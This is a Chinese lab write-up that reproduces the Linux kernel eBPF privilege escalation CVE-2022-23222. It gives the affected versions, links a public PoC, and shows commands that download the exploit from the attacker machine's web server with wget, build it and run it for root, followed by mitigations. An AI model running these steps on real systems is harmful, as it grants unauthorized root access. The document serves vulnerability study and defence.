# Linux-eBPF提权

漏洞复现- Linux Kernel ebpf权限提升漏洞(CVE-2022-23222)

**0x00 前言**

> 由于内核在执行用户提供的 eBPF 程序前缺乏适当的验证，攻击者可以利用这个漏洞获取 root 权限。该漏洞是由于 Linux 内核的 BPF 验证器存在一个空指针漏洞，没有对`*_OR_NULL` 指针类型进行限制，允许这些类型进行指针运算。

利用条件

> 5.8 ≤ Linux Kernel ≤ 5.16（Linux Kernel 5.10.92，5.15.15，5.16.1 不受影响）

`uname -a`查看内核版本

|          | 攻击者         | 靶机（gcc）    |
| -------- | -------------- | -------------- |
| 操作系统 | kali           | CentOS 7       |
| IP地址   | 192.168.12.135 | 192.168.12.131 |
| 内核     |                | 5.8.7          |

> 这里使用普通用户登录靶机，进行提权，前期入侵操作默认完成



**0x01 获取POC代码**

```shell
https://gitee.com/mirrors_gladiopeace/CVE-2022-23222/tree/master
```

将文件存入`/tmp`目录下，开启web服务

```shell
cd /tmp

python -m http.server 8080
```

**0x02 在靶机运行poc代码**

> 如果靶机没有unzip，可以重新使用tar压缩归档

```shell
# 获取漏洞利用工具，此处在kali上使用python开启web服务器，并让被攻击主机下载提权工具源码。
wget http://192.168.12.135:8080/CVE-2022-23222-master.zip

# 解压，编译，安装。
unzip CVE-2022-23222-master.zip
cd CVE-2022-23222-master
make		
# 如果靶机编译出错，可以在自己的环境上编译完成下载编译好的文件
wget http://192.168.12.135:8080/CVE-2022-23222-master/exploit
chmod a+x exploit

# 进行提权。
./exploit 

# 查看
id
whoami
# 是root就成功
```

![image-20230225181249149](https://s2.loli.net/2023/02/27/b93ABMl7TyGua2Q.png)

**0x03 修复方法**

1、非root用户禁止调用ebpf。

```shell
echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled
```

- 值为0表示允许非特权用户调用bpf。
- 值为1表示禁止非特权用户调用bpf且该值不可再修改，只能重启内核后修改。
- 值为2表示禁止非特权用户调用bpf，可以再次修改为0或1。

2、更新系统内核为已修复该漏洞的版本。